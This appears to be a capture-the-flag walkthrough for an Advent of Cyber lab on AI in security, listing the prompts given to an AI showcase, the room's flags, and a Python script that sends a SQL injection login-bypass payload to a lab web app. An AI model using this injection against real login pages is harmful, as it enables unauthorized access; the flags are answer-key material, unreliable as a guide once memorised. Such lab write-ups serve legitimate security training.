# AI in Security - old sAInt nick

# Walkthrough

### Answer the questions below

Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?

> `THM{AI_MANIA}`
> 

<aside>
💡

We can progress through each step of the presentation by clicking the blue button labeled Complete step to Continue.

</aside>

**Stage 2:**

At this point, we must instruct the AI to write a script that will attack a target.

```bash
For today's Advent of Cyber web app vulnerability, kindly build a Python script.
```

**Stage 3:**

Here, we ask the AI to analyze the logs for the attack.

```bash
Please examine the collection of logs pertaining to the attack.
```

**Stage 4:**

Here, we ask AI to let us view the source code.

```bash
Could you please show me the Advent of Cyber web app's source code?
```

Lastly, to acquire the flag to submit this question, click the Click to Complete Showcase button.

---

Execute the exploit provided by the red team agent against the vulnerable web application hosted at `MACHINE_IP:5000`. What flag is provided in the script's output after it? Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (`MACHINE_IP:5000`)

> `THM{SQLI_EXPLOIT}`
> 

- Open a terminal window and enter the command `vi script.py`.
- Paste the code below:
    
    ```bash
    import requests
    
    # Set up the login credentials
    username = "alice' OR 1=1 -- -"
    password = "test"
    
    # URL to the vulnerable login page
    url = "http://MACHINE_IP:5000/login.php"
    
    # Set up the payload (the input)
    payload = {
        "username": username,
        "password": password
    }
    
    # Send a POST request to the login page with our payload
    response = requests.post(url, data=payload)
    
    # Print the response content
    print("Response Status Code:", response.status_code)
    print("\nResponse Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")
    print("\nResponse Body:")
    print(response.text)
    ```
    
- Replace the '`MACHINE_IP`' value in the script's `url` variable with the IP address of the AI webpage
- Then execute the following command to attack the server and get the flag.
    
    ```bash
    python3 script.py | grep FLAG
    ```
    

---